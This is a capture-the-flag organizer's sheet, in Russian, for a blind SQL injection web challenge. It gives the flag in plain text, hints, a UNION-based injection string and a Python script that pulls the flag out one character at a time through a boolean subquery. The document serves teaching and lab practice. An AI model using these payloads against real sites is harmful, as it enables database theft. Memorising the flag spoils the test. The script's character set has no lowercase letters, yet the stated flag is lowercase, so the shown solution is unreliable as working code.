# Challenge 9: SQL Injection Blind

## Информация для организатора

| Параметр | Значение |
|----------|----------|
| **Название** | Слепой SQL |
| **Категория** | Web |
| **Сложность** | Medium |
| **Очки** | 200 |
| **Флаг** | `TATARHACK{bl1nd_sql_1s_sl0w_but_w0rks}` |
| **Порт** | 5003 |

## Описание для участников

> Система проверки пользователей не показывает данные напрямую, 
> но всё равно как-то реагирует на запросы...
> 
> http://localhost:5003
>
> Известно, что флаг хранится в таблице `secrets` в колонке `flag`

## Подсказки

1. Попробуй разные варианты ввода и смотри на ответы
2. Система отвечает "Пользователь существует" или "Пользователь не найден"
3. Используй UNION SELECT или подзапросы для извлечения данных

## Способ решения

### Метод 1: UNION-based injection

```
' UNION SELECT flag FROM secrets--
```

Система ответит "Пользователь существует" если запрос вернул данные.

### Метод 2: Blind extraction (посимвольно)

```python
import requests

url = "http://localhost:5003/check"
flag = ""

for i in range(1, 50):
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
        payload = f"' OR (SELECT SUBSTR(flag,{i},1) FROM secrets)='{c}'--"
        r = requests.post(url, data={"username": payload})
        if "существует" in r.text:
            flag += c
            print(f"Found: {flag}")
            break
    if flag.endswith("}"):
        break

print(f"Flag: {flag}")
```

## Образовательная цель

Показать, что даже без прямого вывода данных можно извлечь информацию.
Познакомить с концепцией Blind SQL Injection.
